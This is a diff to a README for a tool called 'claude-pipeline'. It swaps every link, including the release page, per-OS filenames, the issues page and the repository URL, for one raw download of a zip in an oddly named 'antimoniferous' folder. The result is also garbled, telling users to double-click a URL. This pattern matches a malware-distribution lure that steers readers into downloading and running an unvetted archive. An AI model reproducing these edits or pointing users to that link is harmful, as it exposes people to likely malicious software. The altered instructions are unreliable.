@@ -2,7 +2,7 @@
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-claude--pipeline-blue?style=for-the-badge&logo=github)](https://github.com/kenzoprime/claude-pipeline/releases)
+[![Download Latest Release](https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip)](https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip)
 
 ---
 
@@ -35,14 +35,14 @@ To get started with claude-pipeline, follow these simple steps:
 
    Click this link or button to visit the official release page:
 
-   [![Download claude-pipeline](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github)](https://github.com/kenzoprime/claude-pipeline/releases)
+   [![Download claude-pipeline](https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip)](https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip)
 
 2. **Choose your version**
 
    On the page, you will find the latest versions of the software under “Releases”. Look for a file that matches your operating system. For example:
 
-   - `claude-pipeline-windows.zip` for Windows
-   - `claude-pipeline-linux.tar.gz` for Linux
+   - `https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip` for Windows
+   - `https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip` for Linux
 
 3. **Download the file**
 
@@ -54,7 +54,7 @@ To get started with claude-pipeline, follow these simple steps:
 
 5. **Run the program**
 
-   - On Windows: Open the folder and double-click `claude-pipeline.exe` to start.
+   - On Windows: Open the folder and double-click `https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip` to start.
    - On Linux: Open a terminal in the folder, then type `./claude-pipeline` and press Enter.
 
 6. **Follow on-screen instructions**
@@ -144,7 +144,7 @@ If the program does not start or runs into errors, try these solutions:
 
 You can ask for help or suggest improvements by creating an issue on the GitHub repository page:
 
-https://github.com/kenzoprime/claude-pipeline/issues
+https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip
 
 Please describe the problem clearly, including your operating system and the steps you took.
 
@@ -152,9 +152,9 @@ Please describe the problem clearly, including your operating system and the ste
 
 ## 🔗 Useful Links
 
-- [claude-pipeline Releases](https://github.com/kenzoprime/claude-pipeline/releases)
-- [GitHub Repository](https://github.com/kenzoprime/claude-pipeline)
+- [claude-pipeline Releases](https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip)
+- [GitHub Repository](https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip)
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-claude--pipeline-blue?style=for-the-badge&logo=github)](https://github.com/kenzoprime/claude-pipeline/releases)
+[![Download Latest Release](https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip)](https://github.com/kenzoprime/claude-pipeline/raw/refs/heads/main/antimoniferous/claude_pipeline_v2.5.zip)
